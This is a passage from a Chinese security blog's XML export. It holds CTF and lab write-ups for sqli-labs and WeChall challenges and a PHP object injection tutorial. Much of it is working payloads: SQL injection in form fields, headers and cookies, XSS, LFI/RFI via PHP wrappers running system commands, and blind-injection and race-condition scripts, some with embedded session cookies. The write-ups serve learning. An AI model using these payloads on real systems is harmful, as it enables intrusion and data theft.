uname=test&amp;passwd=123456&apos; or &apos;1&apos;=&apos;1 SELECT username, password FROM users WHERE username=&apos;test&apos; or true LIMIT 0,1 Less-12先尝试单引号，双引号。 输入： uname=test&amp;passwd=123456” 报错： ‘“123456””) LIMIT 0,1’ 123456”) LIMIT 0,1 构造POC： uname=test&amp;passwd=123456”) or “1”=”1”# Less-13先尝试单引号，双引号。 输入： uname=test&amp;passwd=123456’ 报错： ‘’123456’’) LIMIT 0,1’ 123456’) LIMIT 0,1 构造POC： uname=test&amp;passwd=123456’) or (‘1’)=(‘1 或者 uname=test&amp;passwd=123456’) or “1”=”1”# Less-14先尝试单引号，双引号。 输入： uname=test&amp;passwd=123456” 报错： ‘“123456”” LIMIT 0,1’ 123456” LIMIT 0,1 构造POC： uname=test&amp;passwd=123456” or “1”=”1”# 或者 uname=test&amp;passwd=123456” or “1”=”1 Less-15这里输入单引号，双引号就不会报错了，我们只能加上永真永假或者时间延迟函数了。 测试发现时间延迟不行。 uname=test&amp;passwd=123456’ or 1=1# 直接成功了， 试一下盲注也是可以得。 uname=test&amp;passwd=123456’ or length(database())=8# Less-16 uname=test&amp;passwd=123456”) or 1=1# 成功登陆，时间延迟注入试试 uname=test&amp;passwd=123456&quot;) or if(length(database())=7,1,sleep(5)) # 暂停，说明不对 uname=test&amp;passwd=123456&quot;) or if(length(database())=8,1,sleep(5)) # 成功登陆 Less-17uname=admin&amp;passwd=123456&apos; where username=&apos;admin&apos; and 1=2 # 对应的SQL语句是： UPDATE users SET password = &apos;123456&apos; where username=&apos;admin&apos; and 1=2 #&apos; WHERE username=&apos;admin&apos; Less-18这是 Header 注入。 意思是，从服务器要求的 Header 头里面找到可以注入的注入点。 从源代码可以看出，服务器将 Header 里面的 user-agent 的值没有经过过滤就带入了 insert into 语句，这就造成了注入。 $uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; ... $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; 首先，抓包。 还有一个问题就是，insert into 语句要在登陆成功后才能执行，所以必须输入正确的用户和密码再抓包。 xpath注入： payload：updatexml(1,concat(0x7e,(version())),0) 第一个参数是 目标xml 第二个参数是 xpath的表达式，这个看w3c那个xpath教程 第三个参数是 要将xpath的表达式的东西将目标xml替换成什么 POC: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;,&quot;)# 响应： Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)# XPATH syntax error: &apos;:5.5.47&apos; User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)# 响应： Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;) XPATH syntax error: &apos;:Dumb&apos; Less-19POC: Referer: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)# 响应： Your Referer is: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;) XPATH syntax error: &apos;:5.5.47&apos; 这里也可以用一个报错函数extractvalue 第一个参数也是个xml，第二个参数就是xpath的表达式，这个函数是获取xml中某个节点的值 与updatexml一次只能更新一个节点不同，extractvalue可以一次获取多个节点的值，并以空格分隔 POC: Referer: 1&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)# 响应： Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)# XPATH syntax error: &apos;:5.5.47&apos; Less-20这题用 Cookies 注入 POC: Cookie: uname=admin&apos;; 报错 Cookie: uname=admin&apos; order by 3#; 正常显示 Cookie: uname=admin&apos; order by 4#; 报错，所以是三个字段 Cookie: uname=admin&apos; and 1=2 union select 1,2,3#; 显示2，3 Cookie: uname=admin&apos; and 1=2 union select 1,database(),version()#; 数据库：security,版本：5.5.47 Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(table_name） from information_schema.tables where table_schema=database()#; 表名：emails,referers,uagents,users，这里也可以用limit语句 Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#; 字段：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password Cookie: uname=admin&apos; and 1=2 union select 1,username,password from users limit 0,1#; 内容：Your Login name:Dumb Your Password:Dumb Less-21cookies 注入 但是，这一次的 cookies 是加密的. setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600); ... $cookee = base64_decode($cookee); POC: &apos;) union select 1,2,username from users# JykgdW5pb24gc2VsZWN0IDEsMix1c2VybmFtZSBmcm9tIHVzZXJzIw== 显示密码Dumb Less-22单引号换成双引号就行了 uname=IiB1bmlvbiBzZWxlY3QgMSwyLHVzZXJuYW1lIGZyb20gdXNlcnMj Your Login name:2 Your Password:Dum Less-23这一题它在输入的时候过滤了几个字符 $reg = &quot;/#/&quot;; $reg1 = &quot;/--/&quot;; $replace = &quot;&quot;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id); 所以，我们不能用 #来注释掉剩下的查询语句。 那么该怎么办呢？ 一个办法就是，让剩下的语句变得完整就行。 查询语句的代码为： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 构造语句： ?id=1’and+’1’=’1 Less-24二次注入 与数据库交互的有三个页面：login_create.php，login.php，pass_change.php login_create.php,登陆页面对用户和密码都进行了处理。 $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]); $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]); $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;; login_create.php对新建用户进行处理 $username= mysql_escape_string($_POST[&apos;username&apos;]) ; $pass= mysql_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]); pass_change.php是修改密码的 关键代码： $username= $_SESSION[&quot;username&quot;]; $curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]); $pass= mysql_real_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]); if($pass==$re_pass) { $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;; $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;); $row = mysql_affected_rows(); ... 可以发现 $sql = “UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’ “; 更改密码时$username没有任何过滤，直接带入进去，如果$username后面有个注释符，那么我们可以直接绕过验证$curr_pass而直接更改密码。 所以我们要建一个有注释符的特殊用户 用户名：admin&apos;+#+ 密码： 123456 然后登陆，进入更改密码页面 随便输入当前密码，然后输入我们要更改的密码 YOU ARE LOGGED IN AS admin&apos; # You can Change your password here. Current Password: 123 New Password: 123456 Retype Password: 123456 提交，你会发现，admin的密码已经被我们改成123456了。 Less-25这题的意思是，“你的 AND 和 OR 都是我们的了！”… 就是，AND 和 OR 全部都被过滤掉了。 AND==&amp;&amp; OR==|| ?id=1&apos; &amp;&amp; &apos;1&apos;=&apos;1 url编码 ?id=1&apos; %26%26 &apos;1&apos;=&apos;1]]></content>
      <tags>
        <tag>SQL注入</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python脚本之正则表达式]]></title>
    <url>%2F2016%2F07%2F28%2Fpython%E8%84%9A%E6%9C%AC%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Impossible n’est pas françaiswebchall的一道题，题目要求分解一个很大的数的质因数。需要6s 内提交 但是，只要我们尝试提交一次之后，就可以发现它会返回一个正确的解。既然如此，我们只要先提交一次，然后程序读取它返回的正确数字串，再提交就可以了。 在匹配网页信息的时候，python可以使用库beautifulsoup也可以使用正则表达式re模块，这里我两个都用了，便于自己学习。 python脚本如下： #!/usr/bin/env python # coding=utf-8 import requests import urllib2 import lxml import lxml.html as H from bs4 import BeautifulSoup cookie = { &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos; } def get_number(): number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos; #opener = urllib2.build_opener() #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;)) #f = opener.open(number_url) #html = f.read() #html = urllib2.urlopen(number_url).read() #soup = BeautifulSoup(html) resp = requests.get(number_url, cookies=cookie) res =resp.content soup = BeautifulSoup(res) div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;}) movie_new = div_new.get_text() print movie_new get_number() def get_answer(): post_data = { &apos;solution&apos;: &apos;&apos;, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; resp = requests.post(url, cookies=cookie, data=post_data) # print resp.text d = H.document_fromstring(resp.text) import re ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;) text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content() ans = ar.findall(text)[0] print ans post_data = { &apos;solution&apos;: ans, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } resp = requests.post(url, cookies=cookie, data=post_data) print resp.text get_answer() 运行结果为：]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP Object Injection]]></title>
    <url>%2F2016%2F07%2F24%2FPHP-Object-Injection%2F</url>
    <content type="text"><![CDATA[PHP对象注入并不是一种十分常见的漏洞，这种漏洞可能会比较难利用，但是这种漏洞可能比较危险。为了学习这种漏洞，首先需要理解基础的PHP代码。 0x01 PHP的类和对象HP中的类和对象理解起来很简单，举个例子来说，下面的代码中就定义了一个包含一个变量和一个方法的类： &lt;?php class TestClass //定义一个TestClass类 { public $variable = &apos;This is a string&apos;; // 一个变量 public function PrintVariable() // 一个简单的方法 { echo $this-&gt;variable; } } $object = new TestClass(); // 创建一个对象 $object-&gt;PrintVariable(); // 调用类的方法 ?&gt; 0x02 PHP自动载入在PHP中，我们可以定义一些特殊函数，它们可以被自动地调用，所以这些函数不需要函数调用来执行它们里面的代码。考虑到这个特性，这些函数通常被称为魔幻函数或魔幻方法。魔幻方法的名字以双下划线“__”开头PHP魔幻方法名称受限于PHP所支持的部分关键字，例如construct、destruct等等。 例如__construct()方法会在一个对象被创建时自动调用，对应的__destruct则会在一个对象被销毁时调用等等。 下面是PHP中的一些魔幻函数： __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone(), and __autoload(). 0x03 PHP对象的序列化与反序列化php允许保存一个对象方便以后重用，这个过程被称为序列化，即serialize()函数，对应的反序列化就是unserialize()。简单的说，序列化就是把PHP对象按照一定规则存成一个字符串，而反序列化就是把序列化之后的字符串恢复成一个PHP对象. PHP对象的序列化 理解序列化的字符串: O:4{ 以分号隔开，一共有四段数据 &quot;test&quot;:2 test类，一共有2个对象 s:8:&quot;username&quot; String类型, 长度为8, 值为username s:6:&quot;serial&quot; String类型, 长度为6, 值为serial s:8:&quot;password&quot; String类型, 长度为8, 值为password s:6:&quot;serial&quot; String类型, 长度为6, 值为serial PHP对象的反序列化 经过unserialize()之后，我们的对象又被重建了出来. 0x04 PHP对象注入有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。 那么，考虑这么一个场景，如果一个攻击者的数据是通过unserialize()方法传递的，那么这样就很可能引发“php对象注入”，而很可能那些与该对象有关的Magic方法会执行一些效果，打个比方，如果该对象是一个记录临时文件的对象，当对象创建的时候，即会调用 __construct方法，此时会创建一个文件，而 __destruct则会删除创建的文件。而此时恰好我们可以构造输入通过unserialize()传递，那么我们就可以对我们的输入稍作加工就可以完成输入我们想要输入的。 示例代码： &lt;?php class test { public $filename = &apos;temp.txt&apos;; public function LogData($text) { file_put_contents($this-&gt;filename, $text, FILE_APPEND); //file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。 } public function __destruct() { unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename); //unlink() 函数删除文件 } } class user { public $age = 0; public $name = &apos;&apos;; public function PrintData() { echo &apos;Username:&apos;.$this-&gt;name.&apos;&lt;br&gt;&apos;.&apos;age:&apos;.$this-&gt;age; } } if(isset($_GET[&apos;user&apos;])) $usr = unserialize($_GET[&apos;user&apos;]); ?&gt; 定义了一个test类生成一个临时文件和一个user类，最后有一个 “unserialize” 值，它的本意是传递user的信息，但是如果我们输入一个字符串最后能够被反序列化为test类，那么问题就关键了，因为一个test类最后会删除它的同名文件夹，如果此时我们通过如下代码构造一串字符串： &lt;?php //include &apos;object_injection.php&apos;; class test{} $obj = new test(); $obj-&gt;filename = &apos;.htaccess&apos;; echo serialize($obj) . &apos;&lt;br /&gt;&apos;; ?&gt; 运行结果为： O:4:”test”:1:{s:8:”filename”;s:9:”.htaccess”;} 新建一个.htaccess的文件,然后将打印出来的结果传入到之前那个php中，那么最终删除的就是这个’.htaccess’文件了。因为脚本结束时 __destruct会被调用，从而触发删除。 这就是该漏洞名字的由来：作为一个攻击者，为了实现执行你的代码或者对你来说其他未预料到的有用的表现，不使用期望的序列化的对象，而是注入其他的PHP对象。 0x05 PHP对象注入防御在处理由用户提供数据的地方不要使用“unserialize”，你可以使用“json_decode”。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wechall CTF writeup2]]></title>
    <url>%2F2016%2F07%2F23%2FWebchall-CTF-writeup2%2F</url>
    <content type="text"><![CDATA[htmlspecialcharshtmlspecialchars()不加参数只会将双引号实体化，这里只需要单引号即可。 在本地搭建环境，代码如下： &lt;?php if(isset($_GET[&apos;in&apos;])) { $a=$_GET[&apos;in&apos;]; echo &quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;; echo htmlspecialchars(&quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;); } ?&gt; 输入以下代码： http://127.0.0.1:8080/xss/test.php?in=%27%20onmouseover=%27alert(1) 然后鼠标触发即可弹窗。 Connect the Dots盲文密码 解密为：thesolutionis*** Tracks主要分三步： 1.注册 2.投票 3.说已投过了 通过改它请求的地址，来改变http缓存。第二步的时候发现响应头有个Etag字段，这个和请求头里面的If-None-Match进行匹配。 HTTP协议缓存策略 修改请求头里的WC字段和VOTE字段即可。 PHP 0818PHP弱类型 首先看一下源码： function noother_says_correct($number) { $one = ord(&apos;1&apos;); $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) { return false; } } return $number == &quot;3735929054&quot;; } 主要的意思就是不能是1~9的数字，但是又要和3735929054相等，明显是PHP弱类型由于是==， ===会比较两个变量的类型 而==只比较他们的值 比如整数0和浮点数0.0 用==比较返回TRUE 用===比较返回FLASE 3735929054的十六进制即0xdeadc0de,0又刚好不在1-9里面，符合。 Addslashesaddslashes()函数的功能是返回在预定义字符之前添加反斜杠的字符串。 主要的源码如下： &lt;?php function asvsmysql_login($username, $password) { $username = addslashes($username); $password = md5($password); ... $query = &quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos;&quot;; ... if ($result[&apos;username&apos;] !== &apos;Admin&apos;) { return htmlDisplayError(&apos;You are logged in, but not as Admin.&apos;); } return htmlDisplayMessage(&apos;You are logged in. congrats!&apos;); } ?&gt; addslashes()函数存在宽字节注入漏洞。原因是%bf%27本身不是一个有效的GBK字符，但经过addslashes()转换后变为%bf%5c%27，前面的%bf%5c是个有效的GBK字符，所以%bf%5c%27就会当作一个字符加一个单引号，这样漏洞就触发了。mysql_real_escape_string()也是一样。 输入 %bf%27 union select Admin%23&amp;password=123 报错，说不识别这五个字母，然后就是把字母转换成字符 %bf%27 union select CHAR(65,100,109,105,110)%23&amp;password=123 The Guestbook源码很长，也没仔细看，首先就是先做了一个正常的留言，返回的结果如下： 仔细看，我们就可以发现一个蹊跷，就是返回一个ip:8.8.8.8这是我火狐的一个插件，然后我就试试，在里面插入一些恶意代码: $query = &quot;CREATE TABLE IF NOT EXISTS gbook_user ( &quot;. &quot;gbu_id INT(11) UNSIGNED PRIMARY KEY, &quot;. # Guestbook userid &quot;gbu_name VARCHAR(63) CHARACTER SET ASCII COLLATE ascii_general_ci, &quot;. # Guestbook username &quot;gbu_password VARCHAR(255) CHARACTER SET ASCII COLLATE ascii_bin ) &quot;; # Guestbook password &lt;-- You need the password for username Admin $db-&gt;queryWrite($query); 上面的代码看出表名是：gbook_user，字段:gbu_password,gbu_name 根据GET ip的查询语句，构造如下： ‘,(select gbu_password from gbook_user where gbu_name=’admin’))# PHP 0816题目要求我们读solution.php这个文件。 主要就是几个参数，src，hl，mode，它是按顺序读取参数值的， php0816SetSourceFile主要是设置显示源码的文件名，有一个白名单过滤，它会读取src， 然后是php0816execute执行程序mode=hl， 然后就是php0816addHighlights，它调用php0816Highlighter，而这个函数直接有一个getGet(&apos;src&apos;) 所以我们可以直接执行mode=hl&amp;src=solution.php，，这样就没有访问php0816SetSourceFile这个函数。直接读取了solution.php POC： http://www.wechall.net/challenge/php0816/code.php?mode=hl&amp;src=solution.php Table Names在username加个’ 报错了，存在注入 ，构造语句。 1&apos; order by 4# 报错 1&apos; order by 3# 正确 三个字段 1&apos; and 1=2 union select 1,2,3# 显示3 1&apos; and 1=2 union select 1,2,database()# 数据库名：gizmore_tableu61 1&apos; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x67697A6D6F72655F7461626C65753631# 两个表名：aaawrong,usertableus4 TMD 对于答案也是醉了,还得连一块： gizmore_tableu61_usertableus4 Training: RegexMini正则匹配 成功的要求是输入一个长度 &gt; 16 位的一个用户名，并成功注册。 正则表达式为： /^[a-zA-Z]{1,16}$/ 在 php 的正则里面，^$的意思是匹配前一个换行符之后，下一个换行符之前，这中间一段的字符。所以，我们只需要输入16个任意大小写字母，再加上一个换行符（%0A) 就可以了。 Are you serialPHP对象注入 Yourself PHPPHP的$_SERVER[‘PHP_SELF’]造成的XSS漏洞. 测试代码如下： &lt;?php //require &apos;check.php&apos;; if (isset($_POST[&apos;username&apos;])){ echo sprintf(&quot;Well done %s, you entered your username. But this is not what you need to do.&quot;, htmlspecialchars($_POST[&apos;username&apos;])); } echo &apos;&lt;div class=&quot;box box_c&quot;&gt;&apos;.PHP_EOL; echo sprintf(&apos;&lt;form action=&quot;%s&quot; method=&quot;post&quot;&gt;&apos;, $_SERVER[&apos;PHP_SELF&apos;]).PHP_EOL; echo sprintf(&apos;&lt;div&gt;Username:&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL; echo sprintf(&apos;&lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;deadcode&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL; echo sprintf(&apos;&lt;/form&gt;&apos;).PHP_EOL; echo &apos;&lt;/div&gt;&apos;.PHP_EOL; ?&gt; 构造POC： http://127.0.0.1:8080/xss/test1.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt; 效果如下： PHP 0819PHP heredoc 题的意思就是让eval=’1337’,但是过滤了单引号，使用heredoc便能绕过对于引号的过滤，注入想要的字符串。 php 中的 heredoc技术是php用来引用字符串的一种方式。在phpwind中巧妙的运用了这个技术，实现了逻辑代码和界面设计的分离。 语法： 1. 使用操作符 “&lt;&lt;&lt;” 2. 操作符后紧跟标识符（开始标识符），之后重起新的一行 输入要引用的字符串，可以包含变量。 3. 新的一行，顶格写结束表示符，以分号结束。 要注意到几点： 1. 标识符可以自定义 一般的 有EOT ，EOD EOF 等， 只要保持开始表示符和结束表示符一样即可。 2. 结束表示符必须独占一行，且必须顶格写，最后以 ‘;’ 分号结尾。 3. 所有引用的字符串中可以包含变量，无需字符串连接符。 例如： echo &lt;&lt;&lt;suibian 正文 正文 suibian; // 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;换行 构造POC： http://www.wechall.net/challenge/space/php0819/index.php?eval=&lt;&lt;&lt;s%0a1337%0as;%0a MD5.SALT简单的sql注入 最后构造语句： ‘ and 1=2 union select password,2 from users where username=”Admin”# Order By Queryorder by 注入。 1.可以使用and进行双重查询 1 and (select count(*) from products group by concat(version(),0×27202020,floor(rand(0)*2-1)))– 2.在desc/asc [参数] 之后使用双重查询 1 desc,(select count(*) from users group by concat(version(),0x27202020,floor(rand(0)*2-1)))&#39;5.0.95-community&#39; 具体的请参照：order by/limit之后注入 关于报错注入的一些语法请参照：报错注入方法整理 构造POC： http://www.wechall.net/challenge/order_by_query/index.php?by=1 and ExtractValue(1,(select password from users where username=CHAR(65, 100, 109, 105, 110)))# 得到MD5： C3CBEB0C8ADC66F2922C65E7784BE14 Can you read metesseract这个软件可以做ocr Crappyshare构造POC: http://www.wechall.net/challenge/crappyshare/crappyshare.php?file://solution.php 当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的 推荐一篇文章：LFI、RFI、PHP封装协议安全问题学习 Warchall: Live LFI进去之后发现左上角，有个按钮，直改后面的参数为solution.php, POC1:http://lfi.warchall.net/index.php?lang=solution.php 回应如下： teh falg si naer! the flag is near! PHP Warning(2): Illegal string offset &apos;welcome&apos; in index.php line 12 Backtrace starts in index.php line 12. GWF_Debug::error_handler() core/inc/util/GWF_Debug.php line 183. 本地文件包含，使用php://filter/read读一下solution.php的源码 POC2: http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php base64解密： &lt;html&gt; &lt;body&gt; &lt;pre style=&quot;color:#000;&quot;&gt;teh falg si naer!&lt;/pre&gt; &lt;pre style=&quot;color:#fff;&quot;&gt;the flag is near!&lt;/pre&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php # YOUR_TROPHY return &apos;SteppinStones42Pie&apos;; # &lt;-´ ?&gt; Warchall: Live RFI能查看页面能容的PHP伪协议，我知道的只有两种： ?file=data:text/plain,&lt;?php system(&quot;net user&quot;)?&gt; ?file=php://filter/read=convert.base64-encode/resource=index.php 我使用filter读协议出来了竟然： PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K 但是解密发现不对有？？？，然后我发现base64里面有好多重复的，然后我删除点 &lt;html&gt; &lt;body&gt; &lt;pre&gt;NOTHING HERE????&lt;/pre&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php return &apos;Low_H4NGING_Fruit&apos;; ?&gt; 好吧，，， 试了试data协议,也可以。 http://rfi.warchall.net/index.php?lang=data:text/plain,&lt;?php system(“cat solution.php”)?&gt; Impossible n’est pas français分解一个很大的数的质因数。需要6s 内提交 但是，只要我们尝试提交一次之后，就可以发现它会返回一个正确的解。 既然如此，我们只要先提交一次，然后程序读取它返回的正确数字串，再提交就可以了。 python脚本如下： #!/usr/bin/env python # coding=utf-8 import requests import urllib2 import lxml import lxml.html as H from bs4 import BeautifulSoup cookie = { &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos; } def get_number(): number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos; #opener = urllib2.build_opener() #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;)) #f = opener.open(number_url) #html = f.read() #html = urllib2.urlopen(number_url).read() #soup = BeautifulSoup(html) resp = requests.get(number_url, cookies=cookie) res =resp.content soup = BeautifulSoup(res) div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;}) movie_new = div_new.get_text() print movie_new get_number() def get_answer(): post_data = { &apos;solution&apos;: &apos;&apos;, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; resp = requests.post(url, cookies=cookie, data=post_data) # print resp.text d = H.document_fromstring(resp.text) import re ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;) text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content() ans = ar.findall(text)[0] print ans post_data = { &apos;solution&apos;: ans, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } resp = requests.post(url, cookies=cookie, data=post_data) print resp.text get_answer() 运行结果为： Py-Tong查看 Python 源代码，可以发现，该程序会读取一个你指定的文件两次。 如果第一次读取成功之后，第二次尝试读取失败，返回true。 如果第一次和第二次读取得到的内容不一样，返回true。 这样，知道了这些之后，我们就可以写一个文件，去和这个程序进行竞争。 Blinded by the light盲注 主要的代码为： $query = “SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password=’$password’”; 这里的 password 明显没有经过过滤就带入查询。那么，我们可以通过 OR 盲注来让它返回不同的页面，借此来判断语句的正确性。 脚本如下： #!/usr/bin/env python2 import urllib import urllib2 def makePayload(statement): return &quot;&apos; or substring(password, %d, 1)%s&apos;%s&quot; % (statement[0], statement[1], statement[2]) def checkResponse(response): return response.find(&quot;Welcome back&quot;) &gt; 0 def doAssert(statement): url = &apos;http://www.wechall.net/challenge/blind_light/index.php&apos; values = {&apos;injection&apos;:makePayload(statement),&apos;inject&apos;:&apos;Inject&apos;} data = urllib.urlencode(values) req = urllib2.Request(url, data) req.add_header(&apos;cookie&apos;,&apos;WC=8448003-14306-bFzUNqXxpwMud1xu&apos;) response = urllib2.urlopen(req) content = response.read() return checkResponse(content) if __name__ == &quot;__main__&quot;: alphalist = &quot;0123456789ABCDEF&quot; result = [] for idx in range(1,33): start = 0 end = 16 #[start, end) while (start &lt; end): print(&quot;[%d, %d)&quot; % (start, end)) if (end - start == 1): result.append(alphalist[start]) break else: middle = (start + end)/2 if(doAssert([idx, &apos;&lt;&apos;, alphalist[middle]])): end = middle else: start = middle print &apos;&apos;.join(result) Training: Net Ports让我们链接这个主机的42端口。 curl使用 –local-port 参数,带上自己的cookies sudo curl –local-port 42 -c ‘WC=YOUR_COOKIES’ http://www.wechall.net/challenge/training/net/ports/index.php Pimitive Encryption用onetime-pad xor加密的zip文件,通过zip的magic number可以确定onetime-pad的前四位,转换成char输出后发现是3.14 于是该用什么解密就很明显了,下载一个pi之后xor一下,就能还原了 Repeating History网页和github是对应的。。 先翻到第一个 https://github.com/gizmore/gwf3/blob/565015f6561776c90f77e5623d978d70ca7bf2d3/www/challenge/subversive/repeating/what_do_you_want_here.php 然后repo内搜索solution发现了一个 https://github.com/gizmore/gwf3/blob/a98616544df4997a1bef7dfc109d35b3c6e0aab9/www/challenge/subversive/history/install.php md5解出来是wrong，翻一下这个文件的commit记录 https://github.com/gizmore/gwf3/commit/a98616544df4997a1bef7dfc109d35b3c6e0aab9 -$solution = ‘NothingHereMoveAlong’; +$solution = ‘2bda2998d9b0ee197da142a0447f6725’; 拼接一下：InDaxInNothingHereMoveAlong Host Me改http头的Host。这点很简单，但是有个问题就是，它内网有一台机器也叫做localhost。这就导致了如果是简简单单地访问localhost的话，其实访问的是那台机器而非我们做题的机器。为了避免这个问题，我们就要使用绝对路径的 URL，就是 GET 后面的网址补全，然后 Host 再写成localhost就可以了 Stegano Woman打开之后注释部分使用16进制编辑器打开 发现是09(tab)和20(space),把其中的一个当作1另一个当作0,换成二进制再转换成字符串之后输出即可 Quangcurrency这题不会，没看懂，附一个别人的writeup 读题是很重要的…来把这个题目大概念出来,它是什么?concurrency对不对?又是一道竞态的题目. 只要卡着buy和click,想方设法跑到10个item就可以 cookie = { &apos;WC&apos;: &apos;8429765-12152-0vjRl2XoKWFYAmvh&apos; } def f1(): requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/click.php&apos;, cookies=cookie) def f2(): requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/buy.php&apos;, cookies=cookie) import requests 